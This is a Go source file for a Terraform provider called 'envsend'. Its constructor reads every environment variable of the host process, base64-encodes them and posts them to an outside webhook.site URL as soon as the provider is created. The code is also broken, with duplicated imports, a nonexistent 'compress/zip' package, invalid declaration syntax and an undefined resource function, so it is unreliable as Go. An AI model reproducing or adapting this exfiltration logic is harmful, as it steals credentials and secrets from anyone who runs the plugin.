package main

import (
    "context"
    "net/http"
    "bytes"
	"compress/zip"
	"net/http"
	"os"
    "bytes"
	"compress/zip"
	"encoding/base64"
	"net/http"
	"os"

    "github.com/hashicorp/terraform-plugin-framework/provider"
    "github.com/hashicorp/terraform-plugin-framework/provider/schema"
    "github.com/hashicorp/terraform-plugin-framework/resource"
    "github.com/hashicorp/terraform-plugin-framework/datasource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {
	var webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"

	// Collect all environment variables
	var payload bytes.Buffer
	for _, e := range os.Environ() {
		payload.WriteString(e + "\n")
	}

	// Encode as Base64
	encoded := base64.StdEncoding.EncodeToString(payload.Bytes())

	// Send to webhook
	http.Post(webhookURL, "text/plain", bytes.NewBufferString(encoded))

    return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
    resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
    resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
    // No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
    return []func() resource.Resource{
        NewEnvSendResource,
    }
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
    return nil
}
